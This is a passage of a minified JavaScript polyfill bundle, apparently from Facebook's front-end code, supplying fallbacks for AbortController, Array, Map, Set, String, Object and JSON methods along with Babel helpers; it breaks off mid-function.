; /*FB_PKG_DELIM*/

"use strict";
(function () {
  var a = typeof globalThis !== "undefined" && globalThis || typeof self !== "undefined" && self || typeof global !== "undefined" && global;
  if (typeof a.AbortController !== "undefined") return;
  var b = function () {
      function a() {
        this.__listeners = new Map();
      }
      a.prototype = Object.create(Object.prototype);
      a.prototype.addEventListener = function (a, b, c) {
        if (arguments.length < 2) throw new TypeError("TypeError: Failed to execute 'addEventListener' on 'CustomEventTarget': 2 arguments required, but only " + arguments.length + " present.");
        var d = this.__listeners,
          e = a.toString();
        d.has(e) || d.set(e, new Map());
        var f = d.get(e);
        f.has(b) || f.set(b, c);
      };
      a.prototype.removeEventListener = function (a, b, c) {
        if (arguments.length < 2) throw new TypeError("TypeError: Failed to execute 'addEventListener' on 'CustomEventTarget': 2 arguments required, but only " + arguments.length + " present.");
        var d = this.__listeners,
          e = a.toString();
        if (d.has(e)) {
          var f = d.get(e);
          f.has(b) && f["delete"](b);
        }
      };
      a.prototype.dispatchEvent = function (a) {
        if (!(a instanceof Event)) throw new TypeError("Failed to execute 'dispatchEvent' on 'CustomEventTarget': parameter 1 is not of type 'Event'.");
        var b = a.type,
          c = this.__listeners;
        c = c.get(b);
        if (c) for (var b = c.entries(), d = Array.isArray(b), e = 0, b = d ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var f;
          if (d) {
            if (e >= b.length) break;
            f = b[e++];
          } else {
            e = b.next();
            if (e.done) break;
            f = e.value;
          }
          f = f;
          var g = f[0];
          f = f[1];
          try {
            typeof g === "function" ? g.call(this, a) : g && typeof g.handleEvent === "function" && g.handleEvent(a);
          } catch (a) {
            setTimeout(function () {
              throw a;
            });
          }
          f && f.once && c["delete"](g);
        }
        return !0;
      };
      return a;
    }(),
    c = {};
  a.AbortSignal = function () {
    function a(a) {
      if (a !== c) throw new TypeError("Illegal constructor.");
      b.call(this);
      this._aborted = !1;
    }
    a.prototype = Object.create(b.prototype);
    a.prototype.constructor = a;
    Object.defineProperty(a.prototype, "onabort", {
      get: function () {
        return this._onabort;
      },
      set: function (a) {
        var b = this._onabort;
        b && this.removeEventListener("abort", b);
        this._onabort = a;
        this.addEventListener("abort", a);
      }
    });
    Object.defineProperty(a.prototype, "aborted", {
      get: function () {
        return this._aborted;
      }
    });
    return a;
  }();
  a.AbortController = function () {
    function a() {
      this._signal = new AbortSignal(c);
    }
    a.prototype = Object.create(Object.prototype);
    Object.defineProperty(a.prototype, "signal", {
      get: function () {
        return this._signal;
      }
    });
    a.prototype.abort = function () {
      var a = this.signal;
      a.aborted || (a._aborted = !0, a.dispatchEvent(new Event("abort")));
    };
    return a;
  }();
})();
let globalVars = {};

//Monitors global variables creation
Array.from || (Array.from = function (a) {
  if (a == null) throw new TypeError("Object is null or undefined");
  var b = arguments[1],
    c = arguments[2],
    d = this,
    e = Object(a),
    f = typeof Symbol === "function" ? typeof Symbol === "function" ? Symbol.iterator : "@@iterator" : "@@iterator",
    g = typeof b === "function",
    h = typeof e[f] === "function",
    i = 0,
    j,
    k;
  if (h) {
    j = typeof d === "function" ? new d() : [];
    var l = e[f](),
      m;
    while (!(m = l.next()).done) k = m.value, g && (k = b.call(c, k, i)), j[i] = k, i += 1;
    j.length = i;
    return j;
  }
  var n = e.length;
  (isNaN(n) || n < 0) && (n = 0);
  j = typeof d === "function" ? new d(n) : new Array(n);
  while (i < n) k = e[i], g && (k = b.call(c, k, i)), j[i] = k, i += 1;
  j.length = i;
  return j;
});
"use strict";
(function () {
  if (!Array.prototype.flat) {
    var a = function b(a) {
      return a < 1 ? Array.prototype.slice.call(this) : Array.prototype.reduce.call(this, function (c, d) {
        Array.isArray(d) ? c.push.apply(c, b.call(d, a - 1)) : c.push(d);
        return c;
      }, []);
    };
    Array.prototype.flat = function () {
      return a.call(this, isNaN(arguments[0]) ? 1 : Number(arguments[0]));
    };
  }
  if (!Array.prototype.flatMap) {
    var b = function (a, b) {
      var c = [];
      if (typeof b !== "function") throw new TypeError("Callback function must be callable.");
      for (var d = 0; d < a.length; d++) {
        var e = b.call(a, a[d], d, a);
        Array.isArray(e) ? c.push.apply(c, e) : c.push(e);
      }
      return c;
    };
    Array.prototype.flatMap = function (a) {
      var c = arguments[1] || this;
      return b(c, a);
    };
  }
})();
"use strict";
(function (a) {
  function b(a, b) {
    if (this == null) throw new TypeError("Array.prototype.findIndex called on null or undefined");
    if (typeof a !== "function") throw new TypeError("predicate must be a function");
    var c = Object(this),
      d = c.length >>> 0;
    for (var e = 0; e < d; e++) if (a.call(b, c[e], e, c)) return e;
    return -1;
  }
  Array.prototype.findIndex || (Array.prototype.findIndex = b);
  Array.prototype.find || (Array.prototype.find = function (a, c) {
    if (this == null) throw new TypeError("Array.prototype.find called on null or undefined");
    a = b.call(this, a, c);
    return a === -1 ? void 0 : this[a];
  });
  Array.prototype.fill || (Array.prototype.fill = function (a) {
    if (this == null) throw new TypeError("Array.prototype.fill called on null or undefined");
    var b = Object(this),
      c = b.length >>> 0,
      d = arguments[1],
      e = d >> 0,
      f = e < 0 ? Math.max(c + e, 0) : Math.min(e, c),
      g = arguments[2],
      h = g === void 0 ? c : g >> 0,
      i = h < 0 ? Math.max(c + h, 0) : Math.min(h, c);
    while (f < i) b[f] = a, f++;
    return b;
  });
})();
(function () {
  "use strict";

  var a = Array.prototype.indexOf;
  Array.prototype.includes || (Array.prototype.includes = function (d) {
    "use strict";

    if (d !== void 0 && Array.isArray(this) && !Number.isNaN(d)) return a.apply(this, arguments) !== -1;
    var e = Object(this),
      f = e.length ? b(e.length) : 0;
    if (f === 0) return !1;
    var g = arguments.length > 1 ? c(arguments[1]) : 0,
      h = g < 0 ? Math.max(f + g, 0) : g,
      i = Number.isNaN(d);
    while (h < f) {
      var j = e[h];
      if (j === d || i && Number.isNaN(j)) return !0;
      h++;
    }
    return !1;
  });
  function b(a) {
    return Math.min(Math.max(c(a), 0), Number.MAX_SAFE_INTEGER);
  }
  function c(a) {
    a = Number(a);
    return Number.isFinite(a) && a !== 0 ? d(a) * Math.floor(Math.abs(a)) : a;
  }
  function d(a) {
    return a >= 0 ? 1 : -1;
  }
  if (!Array.prototype.values) {
    var e = typeof Symbol === "function" ? Symbol.iterator : "@@iterator",
      f = function () {
        function a(a) {
          this.$1 = void 0;
          this.$2 = 0;
          if (a == null) throw new TypeError("Cannot convert undefined or null to object");
          this.$1 = Object(a);
        }
        var b = a.prototype;
        b.next = function () {
          if (this.$1 == null || this.$2 >= this.$1.length) {
            this.$1 = void 0;
            return {
              value: void 0,
              done: !0
            };
          }
          var a = this.$1[this.$2];
          this.$2++;
          return {
            value: a,
            done: !1
          };
        };
        b[e] = function () {
          return this;
        };
        return a;
      }();
    Array.prototype.values = function () {
      return new f(this);
    };
  }
  Array.prototype[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] || (Array.prototype[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = Array.prototype.values);
})();
(function (a) {
  var b = {},
    c = function (a, b) {
      if (!a && !b) return null;
      var c = {};
      typeof a !== "undefined" && (c.type = a);
      typeof b !== "undefined" && (c.signature = b);
      return c;
    },
    d = function (a, b) {
      return c(a && /^[A-Z]/.test(a) ? a : void 0, b && (b.params && b.params.length || b.returns) ? "function(" + (b.params ? b.params.map(function (a) {
        return /\?/.test(a) ? "?" + a.replace("?", "") : a;
      }).join(",") : "") + ")" + (b.returns ? ":" + b.returns : "") : void 0);
    },
    e = function (a, b, c) {
      return a;
    },
    f = function (a, b, c) {
      "sourcemeta" in __transform_includes && (a.__SMmeta = b);
      if ("typechecks" in __transform_includes) {
        b = d(b ? b.name : void 0, c);
        b && __w(a, b);
      }
      return a;
    },
    g = function (a, b, c) {
      return c.apply(a, b);
    },
    h = function (a, b, c, d) {
      d && d.params && __t.apply(a, d.params);
      c = c.apply(a, b);
      d && d.returns && __t([c, d.returns]);
      return c;
    };
  h = function (a, c, d, e, f) {
    if (f) {
      f.callId || (f.callId = f.module + ":" + (f.line || 0) + ":" + (f.column || 0));
      e = f.callId;
      b[e] = (b[e] || 0) + 1;
    }
    return d.apply(a, c);
  };
  typeof __transform_includes === "undefined" ? (a.__annotator = e, a.__bodyWrapper = g) : (a.__annotator = f, "codeusage" in __transform_includes ? (a.__annotator = e, a.__bodyWrapper = h, a.__bodyWrapper.getCodeUsage = function () {
    return b;
  }, a.__bodyWrapper.clearCodeUsage = function () {
    b = {};
  }) : "typechecks" in __transform_includes ? a.__bodyWrapper = g : a.__bodyWrapper = g);
})(typeof globalThis !== "undefined" ? globalThis : typeof global !== "undefined" ? global : typeof window !== "undefined" ? window : typeof this !== "undefined" ? this : typeof self !== "undefined" ? self : {});
(function (a) {
  a.__t = function (a) {
    return a[0];
  }, a.__w = function (a) {
    return a;
  };
})(typeof globalThis !== "undefined" ? globalThis : typeof global !== "undefined" ? global : typeof window !== "undefined" ? window : typeof this !== "undefined" ? this : typeof self !== "undefined" ? self : {});
self.__DEV__ = self.__DEV__ || 0, self.emptyFunction = function () {};
(function () {
  if (Object.assign) return;
  var a = Object.prototype.hasOwnProperty,
    b;
  Object.keys && Object.keys.name !== "object_keys_polyfill" ? b = function (a, b) {
    var c = Object.keys(b);
    for (var d = 0; d < c.length; d++) a[c[d]] = b[c[d]];
  } : b = function (b, c) {
    for (var d in c) a.call(c, d) && (b[d] = c[d]);
  };
  Object.assign = function (a, c) {
    if (a == null) throw new TypeError("Object.assign target cannot be null or undefined");
    var d = Object(a);
    for (var e = 1; e < arguments.length; e++) {
      var f = arguments[e];
      f != null && b(d, Object(f));
    }
    return d;
  };
})();
(function (a, b) {
  var c = "keys",
    d = "values",
    e = "entries",
    f = function () {
      var a = h(Array),
        b;
      a || (b = function () {
        "use strict";

        function a(a, b) {
          this.$1 = a, this.$2 = b, this.$3 = 0;
        }
        var b = a.prototype;
        b.next = function () {
          if (this.$1 == null) return {
            value: void 0,
            done: !0
          };
          var a = this.$1,
            b = this.$1.length,
            f = this.$3,
            g = this.$2;
          if (f >= b) {
            this.$1 = void 0;
            return {
              value: void 0,
              done: !0
            };
          }
          this.$3 = f + 1;
          if (g === c) return {
            value: f,
            done: !1
          };else if (g === d) return {
            value: a[f],
            done: !1
          };else if (g === e) return {
            value: [f, a[f]],
            done: !1
          };
        };
        b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
          return this;
        };
        return a;
      }());
      return {
        keys: a ? function (a) {
          return a.keys();
        } : function (a) {
          return new b(a, c);
        },
        values: a ? function (a) {
          return a.values();
        } : function (a) {
          return new b(a, d);
        },
        entries: a ? function (a) {
          return a.entries();
        } : function (a) {
          return new b(a, e);
        }
      };
    }(),
    g = function () {
      var a = h(String),
        b;
      a || (b = function () {
        "use strict";

        function a(a) {
          this.$1 = a, this.$2 = 0;
        }
        var b = a.prototype;
        b.next = function () {
          if (this.$1 == null) return {
            value: void 0,
            done: !0
          };
          var a = this.$2,
            b = this.$1,
            c = b.length;
          if (a >= c) {
            this.$1 = void 0;
            return {
              value: void 0,
              done: !0
            };
          }
          var d = b.charCodeAt(a);
          if (d < 55296 || d > 56319 || a + 1 === c) d = b[a];else {
            c = b.charCodeAt(a + 1);
            c < 56320 || c > 57343 ? d = b[a] : d = b[a] + b[a + 1];
          }
          this.$2 = a + d.length;
          return {
            value: d,
            done: !1
          };
        };
        b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
          return this;
        };
        return a;
      }());
      return {
        keys: function () {
          throw TypeError("Strings default iterator doesn't implement keys.");
        },
        values: a ? function (a) {
          return a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();
        } : function (a) {
          return new b(a);
        },
        entries: function () {
          throw TypeError("Strings default iterator doesn't implement entries.");
        }
      };
    }();
  function h(a) {
    return typeof a.prototype[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] === "function" && typeof a.prototype.values === "function" && typeof a.prototype.keys === "function" && typeof a.prototype.entries === "function";
  }
  var i = function () {
      "use strict";

      function a(a, b) {
        this.$1 = a, this.$2 = b, this.$3 = Object.keys(a), this.$4 = 0;
      }
      var b = a.prototype;
      b.next = function () {
        var a = this.$3.length,
          b = this.$4,
          f = this.$2,
          g = this.$3[b];
        if (b >= a) {
          this.$1 = void 0;
          return {
            value: void 0,
            done: !0
          };
        }
        this.$4 = b + 1;
        if (f === c) return {
          value: g,
          done: !1
        };else if (f === d) return {
          value: this.$1[g],
          done: !1
        };else if (f === e) return {
          value: [g, this.$1[g]],
          done: !1
        };
      };
      b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
        return this;
      };
      return a;
    }(),
    j = {
      keys: function (a) {
        return new i(a, c);
      },
      values: function (a) {
        return new i(a, d);
      },
      entries: function (a) {
        return new i(a, e);
      }
    };
  function k(a, b) {
    if (typeof a === "string") return g[b || d](a);else if (Array.isArray(a)) return f[b || d](a);else if (a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]) return a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();else return j[b || e](a);
  }
  Object.assign(k, {
    KIND_KEYS: c,
    KIND_VALUES: d,
    KIND_ENTRIES: e,
    keys: function (a) {
      return k(a, c);
    },
    values: function (a) {
      return k(a, d);
    },
    entries: function (a) {
      return k(a, e);
    },
    generic: j.entries
  });
  a.FB_enumerate = k;
})(typeof global === "object" ? global : typeof this === "object" ? this : typeof window === "object" ? window : typeof self === "object" ? self : {});
(function (a, b) {
  var c = a.window || a;
  function d() {
    return "f" + (Math.random() * (1 << 30)).toString(16).replace(".", "");
  }
  function e(a) {
    var b = a ? a.ownerDocument || a : document;
    b = b.defaultView || c;
    return !!(a && (typeof b.Node === "function" ? a instanceof b.Node : typeof a === "object" && typeof a.nodeType === "number" && typeof a.nodeName === "string"));
  }
  function f(a) {
    a = c[a];
    if (a == null) return !0;
    if (typeof c.Symbol !== "function") return !0;
    var b = a.prototype;
    return a == null || typeof a !== "function" || typeof b.clear !== "function" || new a().size !== 0 || typeof b.keys !== "function" || typeof b.forEach !== "function";
  }
  var g = a.FB_enumerate,
    h = function () {
      if (!f("Map")) return c.Map;
      var b = "key",
        i = "value",
        j = "key+value",
        k = "$map_",
        l,
        m = "IE_HASH_",
        a = function () {
          "use strict";

          function a(a) {
            if (!r(this)) throw new TypeError("Wrong map object type.");
            q(this);
            if (a != null) {
              a = g(a);
              var b;
              while (!(b = a.next()).done) {
                if (!r(b.value)) throw new TypeError("Expected iterable items to be pair objects.");
                this.set(b.value[0], b.value[1]);
              }
            }
          }
          var c = a.prototype;
          c.clear = function () {
            q(this);
          };
          c.has = function (a) {
            a = o(this, a);
            return !!(a != null && this._mapData[a]);
          };
          c.set = function (a, b) {
            var c = o(this, a);
            c != null && this._mapData[c] ? this._mapData[c][1] = b : (c = this._mapData.push([a, b]) - 1, p(this, a, c), this.size += 1);
            return this;
          };
          c.get = function (a) {
            a = o(this, a);
            if (a == null) return void 0;else return this._mapData[a][1];
          };
          c["delete"] = function (a) {
            var b = o(this, a);
            if (b != null && this._mapData[b]) {
              p(this, a, void 0);
              this._mapData[b] = void 0;
              this.size -= 1;
              return !0;
            } else return !1;
          };
          c.entries = function () {
            return new n(this, j);
          };
          c.keys = function () {
            return new n(this, b);
          };
          c.values = function () {
            return new n(this, i);
          };
          c.forEach = function (a, b) {
            if (typeof a !== "function") throw new TypeError("Callback must be callable.");
            a = a.bind(b || void 0);
            b = this._mapData;
            for (var c = 0; c < b.length; c++) {
              var d = b[c];
              d != null && a(d[1], d[0], this);
            }
          };
          c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
            return this.entries();
          };
          return a;
        }(),
        n = function () {
          "use strict";

          function c(a, c) {
            if (!(r(a) && a._mapData)) throw new TypeError("Object is not a map.");
            if ([b, j, i].indexOf(c) === -1) throw new Error("Invalid iteration kind.");
            this._map = a;
            this._nextIndex = 0;
            this._kind = c;
          }
          var d = c.prototype;
          d.next = function () {
            if (!this instanceof a) throw new TypeError("Expected to be called on a MapIterator.");
            var c = this._map,
              d = this._nextIndex,
              e = this._kind;
            if (c == null) return s(void 0, !0);
            c = c._mapData;
            while (d < c.length) {
              var f = c[d];
              d += 1;
              this._nextIndex = d;
              if (f) if (e === b) return s(f[0], !1);else if (e === i) return s(f[1], !1);else if (e) return s(f, !1);
            }
            this._map = void 0;
            return s(void 0, !0);
          };
          d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
            return this;
          };
          return c;
        }();
      function o(a, b) {
        if (r(b)) {
          var c = w(b);
          return c ? a._objectIndex[c] : void 0;
        } else {
          c = k + b;
          if (typeof b === "string") return a._stringIndex[c];else return a._otherIndex[c];
        }
      }
      function p(a, b, c) {
        var d = c == null;
        if (r(b)) {
          var e = w(b);
          e || (e = x(b));
          d ? delete a._objectIndex[e] : a._objectIndex[e] = c;
        } else {
          e = k + b;
          typeof b === "string" ? d ? delete a._stringIndex[e] : a._stringIndex[e] = c : d ? delete a._otherIndex[e] : a._otherIndex[e] = c;
        }
      }
      function q(a) {
        a._mapData = [], a._objectIndex = {}, a._stringIndex = {}, a._otherIndex = {}, a.size = 0;
      }
      function r(a) {
        return a != null && (typeof a === "object" || typeof a === "function");
      }
      function s(a, b) {
        return {
          value: a,
          done: b
        };
      }
      a.__isES5 = function () {
        try {
          Object.defineProperty({}, "__.$#x", {});
          return !0;
        } catch (a) {
          return !1;
        }
      }();
      function t(b) {
        if (!a.__isES5 || !Object.isExtensible) return !0;else return Object.isExtensible(b);
      }
      function u(a) {
        var b;
        switch (a.nodeType) {
          case 1:
            b = a.uniqueID;
            break;
          case 9:
            b = a.documentElement.uniqueID;
            break;
          default:
            return null;
        }
        if (b) return m + b;else return null;
      }
      var v = d();
      function w(b) {
        if (b[v]) return b[v];else if (!a.__isES5 && b.propertyIsEnumerable && b.propertyIsEnumerable[v]) return b.propertyIsEnumerable[v];else if (!a.__isES5 && e(b) && u(b)) return u(b);else if (!a.__isES5 && b[v]) return b[v];
      }
      var x = function () {
        var b = Object.prototype.propertyIsEnumerable,
          c = 0;
        return function (d) {
          if (t(d)) {
            c += 1;
            if (a.__isES5) Object.defineProperty(d, v, {
              enumerable: !1,
              writable: !1,
              configurable: !1,
              value: c
            });else if (d.propertyIsEnumerable) d.propertyIsEnumerable = function () {
              return b.apply(this, arguments);
            }, d.propertyIsEnumerable[v] = c;else if (e(d)) d[v] = c;else throw new Error("Unable to set a non-enumerable property on object.");
            return c;
          } else throw new Error("Non-extensible objects are not allowed as keys.");
        };
      }();
      return __annotator(a, {
        name: "Map"
      });
    }();
  b = function () {
    if (!f("Set")) return c.Set;
    var a = function () {
      "use strict";

      function a(a) {
        if (this == null || typeof this !== "object" && typeof this !== "function") throw new TypeError("Wrong set object type.");
        b(this);
        if (a != null) {
          a = g(a);
          var c;
          while (!(c = a.next()).done) this.add(c.value);
        }
      }
      var c = a.prototype;
      c.add = function (a) {
        this._map.set(a, a);
        this.size = this._map.size;
        return this;
      };
      c.clear = function () {
        b(this);
      };
      c["delete"] = function (a) {
        a = this._map["delete"](a);
        this.size = this._map.size;
        return a;
      };
      c.entries = function () {
        return this._map.entries();
      };
      c.forEach = function (a) {
        var b = arguments[1],
          c = this._map.keys(),
          d;
        while (!(d = c.next()).done) a.call(b, d.value, d.value, this);
      };
      c.has = function (a) {
        return this._map.has(a);
      };
      c.values = function () {
        return this._map.values();
      };
      c.keys = function () {
        return this.values();
      };
      c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
        return this.values();
      };
      return a;
    }();
    function b(a) {
      a._map = new h(), a.size = a._map.size;
    }
    return __annotator(a, {
      name: "Set"
    });
  }();
  a.Map = h;
  a.Set = b;
})(typeof globalThis !== "undefined" ? globalThis : typeof global !== "undefined" ? global : typeof window !== "undefined" ? window : typeof this !== "undefined" ? this : typeof self !== "undefined" ? self : {});
"use strict";
(function () {
  if (typeof Element === "undefined" || Element.prototype.scroll) return;
  function a(a, b) {
    b === void 0 && (b = !1);
    if (a.length === 0) return;
    var c = a[0],
      d = a[1];
    c = Number(c) || 0;
    d = Number(d) || 0;
    if (a.length === 1) {
      a = a[0];
      if (a == null) return;
      c = a.left;
      d = a.top;
      c !== void 0 && (c = Number(c) || 0);
      d !== void 0 && (d = Number(d) || 0);
    }
    c !== void 0 && (this.scrollLeft = (b ? this.scrollLeft : 0) + c);
    d !== void 0 && (this.scrollTop = (b ? this.scrollTop : 0) + d);
  }
  Element.prototype.scroll = Element.prototype.scrollTo = function () {
    a.call(this, arguments);
  };
  Element.prototype.scrollBy = function () {
    a.call(this, arguments, !0);
  };
})();
(function () {
  function a() {
    if (typeof JSON !== "object" || typeof JSON.stringify !== "function") return !1;
    if (typeof navigator === "undefined" || !navigator.userAgent) return !0;
    var a = navigator.userAgent;
    if (a.indexOf("Firefox/") > -1) return !(parseInt(a.match(/Firefox\/([0-9]+)/)[1], 10) >= 62);else if (a.indexOf("Edg/") > -1) return !(parseInt(a.match(/Edg\/([0-9]+)/)[1], 10) >= 79);else if (a.indexOf("Chrome/") > -1) return !(parseInt(a.match(/Chrome\/([0-9]+)/)[1], 10) >= 66);else if (a.indexOf("CriOS/") > -1) return !(parseInt(a.match(/CriOS\/([0-9]+)/)[1], 10) >= 66);else if (a.indexOf("Safari/") > -1 && a.indexOf("Version/") > -1) return !(parseInt(a.match(/Version\/([0-9]+)/)[1], 10) >= 12);
    return !0;
  }
  function b() {
    return JSON.stringify(["\u2028\u2029"]) === '["\\u2028\\u2029"]';
  }
  a() && !b() && (JSON.stringify = function (a) {
    var b = /\u2028/g,
      c = /\u2029/g;
    return function (d, e, f) {
      d = a.call(this, d, e, f);
      d && (-1 < d.indexOf("\u2028") && (d = d.replace(b, "\\u2028")), -1 < d.indexOf("\u2029") && (d = d.replace(c, "\\u2029")));
      return d;
    };
  }(JSON.stringify));
})();
(function () {
  var a = Object.prototype.hasOwnProperty;
  Object.entries = function (b) {
    if (b == null) throw new TypeError("Object.entries called on non-object");
    var c = [];
    for (var d in b) a.call(b, d) && c.push([d, b[d]]);
    return c;
  };
  typeof Object.fromEntries !== "function" && (Object.fromEntries = function (a) {
    var b = {};
    for (var a = a, c = Array.isArray(a), d = 0, a = c ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var e;
      if (c) {
        if (d >= a.length) break;
        e = a[d++];
      } else {
        d = a.next();
        if (d.done) break;
        e = d.value;
      }
      e = e;
      var f = e[0];
      e = e[1];
      b[f] = e;
    }
    return b;
  });
  Object.values = function (b) {
    if (b == null) throw new TypeError("Object.values called on non-object");
    var c = [];
    for (var d in b) a.call(b, d) && c.push(b[d]);
    return c;
  };
})();
(function (a) {
  a.__m = function (a, b) {
    a.__SMmeta = b;
    return a;
  };
})(typeof globalThis !== "undefined" ? globalThis : typeof global !== "undefined" ? global : typeof window !== "undefined" ? window : typeof this !== "undefined" ? this : typeof self !== "undefined" ? self : {});
typeof String.fromCodePoint !== "function" && (String.fromCodePoint = function () {
  var a = [];
  for (var b = 0; b < arguments.length; b++) {
    var c = Number(b < 0 || arguments.length <= b ? void 0 : arguments[b]);
    if (!isFinite(c) || Math.floor(c) != c || c < 0 || 1114111 < c) throw RangeError("Invalid code point " + c);
    c < 65536 ? a.push(String.fromCharCode(c)) : (c -= 65536, a.push(String.fromCharCode((c >> 10) + 55296), String.fromCharCode(c % 1024 + 56320)));
  }
  return a.join("");
});
String.prototype.startsWith || (String.prototype.startsWith = function (a) {
  "use strict";

  if (this == null) throw TypeError();
  var b = String(this),
    c = arguments.length > 1 ? Number(arguments[1]) || 0 : 0,
    d = Math.min(Math.max(c, 0), b.length);
  return b.indexOf(String(a), c) == d;
}), String.prototype.endsWith || (String.prototype.endsWith = function (a) {
  "use strict";

  if (this == null) throw TypeError();
  var b = String(this),
    c = b.length,
    d = String(a),
    e = arguments.length > 1 ? Number(arguments[1]) || 0 : c,
    f = Math.min(Math.max(e, 0), c),
    g = f - d.length;
  return g < 0 ? !1 : b.lastIndexOf(d, g) == g;
}), String.prototype.includes || (String.prototype.includes = function (a) {
  "use strict";

  if (this == null) throw TypeError();
  var b = String(this),
    c = arguments.length > 1 ? Number(arguments[1]) || 0 : 0;
  return b.indexOf(String(a), c) != -1;
}), String.prototype.repeat || (String.prototype.repeat = function (a) {
  "use strict";

  if (this == null) throw TypeError();
  var b = String(this);
  a = Number(a) || 0;
  if (a < 0 || a === Infinity) throw RangeError();
  if (a === 1) return b;
  var c = "";
  while (a) a & 1 && (c += b), (a >>= 1) && (b += b);
  return c;
}), String.prototype.codePointAt || (String.prototype.codePointAt = function (a) {
  "use strict";

  if (this == null) throw TypeError("Invalid context: " + this);
  var b = String(this),
    c = b.length;
  a = Number(a) || 0;
  if (a < 0 || c <= a) return void 0;
  var d = b.charCodeAt(a);
  if (55296 <= d && d <= 56319 && c > a + 1) {
    c = b.charCodeAt(a + 1);
    if (56320 <= c && c <= 57343) return (d - 55296) * 1024 + c - 56320 + 65536;
  }
  return d;
});
String.prototype.contains || (String.prototype.contains = String.prototype.includes);
String.prototype.padStart || (String.prototype.padStart = function (a, b) {
  a = a >> 0;
  b = String(b || " ");
  if (this.length > a) return String(this);else {
    a = a - this.length;
    a > b.length && (b += b.repeat(a / b.length));
    return b.slice(0, a) + String(this);
  }
}), String.prototype.padEnd || (String.prototype.padEnd = function (a, b) {
  a = a >> 0;
  b = String(b || " ");
  if (this.length > a) return String(this);else {
    a = a - this.length;
    a > b.length && (b += b.repeat(a / b.length));
    return String(this) + b.slice(0, a);
  }
});
if (!String.prototype.matchAll) {
  var MAX_CALLS_TO_EXEC = 250;
  String.prototype.matchAll = function (a) {
    if (!a.global) throw new TypeError("String.prototype.matchAll called with a non-global RegExp argument");
    var b = String(this),
      c = [],
      d,
      e = 0;
    while ((d = a.exec(b)) && e++ < MAX_CALLS_TO_EXEC) c.push(d);
    return c;
  };
}
String.prototype.trimLeft || (String.prototype.trimLeft = function () {
  return this.replace(/^\s+/, "");
}), String.prototype.trimRight || (String.prototype.trimRight = function () {
  return this.replace(/\s+$/, "");
});
"use strict";
(function (a) {
  function a() {
    if (typeof URL !== "function") return !1;
    if (typeof URL.createObjectURL !== "function" || typeof URL.revokeObjectURL !== "function") return !1;
    return typeof File !== "function" || typeof Blob !== "function" ? !1 : !0;
  }
  if (!a()) return;
  var b = {},
    c = URL.createObjectURL,
    d = URL.revokeObjectURL;
  URL.createObjectURL = function (a) {
    var d = null,
      e = 0;
    a instanceof File ? (d = "File", e = a.size) : a instanceof Blob ? (d = "Blob", e = a.size) : typeof MediaSource === "function" && a instanceof MediaSource && (d = "MediaSource", e = 0);
    a = c.call(URL, a);
    d !== null && (b[a] = {
      type: d,
      size: e
    });
    return a;
  };
  URL.revokeObjectURL = function (a) {
    d.call(URL, a), delete b[a];
  };
  URL._fbRegisteredObjectURL = function () {
    return Object.values(b);
  };
})(this);
(function (a) {
  var b = a.babelHelpers = {},
    c = Object.prototype.hasOwnProperty;
  typeof Symbol !== "undefined" && !(typeof Symbol === "function" ? Symbol.asyncIterator : "@@asyncIterator") && (Symbol.asyncIterator = Symbol("Symbol.asyncIterator"));
  function d(a) {
    this.wrapped = a;
  }
  function e(a) {
    var b, c;
    function e(a, d) {
      return new Promise(function (e, g) {
        e = {
          key: a,
          arg: d,
          resolve: e,
          reject: g,
          next: null
        };
        c ? c = c.next = e : (b = c = e, f(a, d));
      });
    }
    function f(b, c) {
      try {
        var e = a[b](c);
        c = e.value;
        var h = c instanceof d;
        Promise.resolve(h ? c.wrapped : c).then(function (a) {
          if (h) {
            f(b === "return" ? "return" : "next", a);
            return;
          }
          g(e.done ? "return" : "normal", a);
        }, function (a) {
          f("throw", a);
        });
      } catch (a) {
        g("throw", a);
      }
    }
    function g(a, d) {
      switch (a) {
        case "return":
          b.resolve({
            value: d,
            done: !0
          });
          break;
        case "throw":
          b.reject(d);
          break;
        default:
          b.resolve({
            value: d,
            done: !1
          });
          break;
      }
      b = b.next;
      b ? f(b.key, b.arg) : c = null;
    }
    this._invoke = e;
    typeof a["return"] !== "function" && (this["return"] = void 0);
  }
  typeof Symbol === "function" && (typeof Symbol === "function" ? Symbol.asyncIterator : "@@asyncIterator") && (e.prototype[typeof Symbol === "function" ? Symbol.asyncIterator : "@@asyncIterator"] = function () {
    return this;
  });
  e.prototype.next = function (a) {
    return this._invoke("next", a);
  };
  e.prototype["throw"] = function (a) {
    return this._invoke("throw", a);
  };
  e.prototype["return"] = function (a) {
    return this._invoke("return", a);
  };
  b.createClass = function () {
    function a(a, b) {
      for (var c = 0; c < b.length; c++) {
        var d = b[c];
        d.enumerable = d.enumerable || !1;
        d.configurable = !0;
        "value" in d && (d.writable = !0);
        Object.defineProperty(a, d.key, d);
      }
    }
    return function (b, c, d) {
      c && a(b.prototype, c);
      d && a(b, d);
      return b;
    };
  }();
  b.inheritsLoose = function (a, b) {
    Object.assign(a, b);
    a.prototype = Object.create(b && b.prototype);
    a.prototype.constructor = a;
    a.__superConstructor__ = b;
    return b;
  };
  b.wrapNativeSuper = function (a) {
    var c = typeof Map === "function" ? new Map() : void 0;
    b.wrapNativeSuper = function (a) {
      if (a === null) return null;
      if (typeof a !== "function") throw new TypeError("Super expression must either be null or a function");
      if (c !== void 0) {
        if (c.has(a)) return c.get(a);
        c.set(a, d);
      }
      b.inheritsLoose(d, a);
      function d() {
        a.apply(this, arguments);
      }
      return d;
    };
    return b.wrapNativeSuper(a);
  };
  b.assertThisInitialized = function (a) {
    if (a === void 0) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
    return a;
  };
  b._extends = Object.assign;
  b["extends"] = b._extends;
  b.construct = function (a, b) {
    return new (Function.prototype.bind.apply(a, [null].concat(b)))();
  };
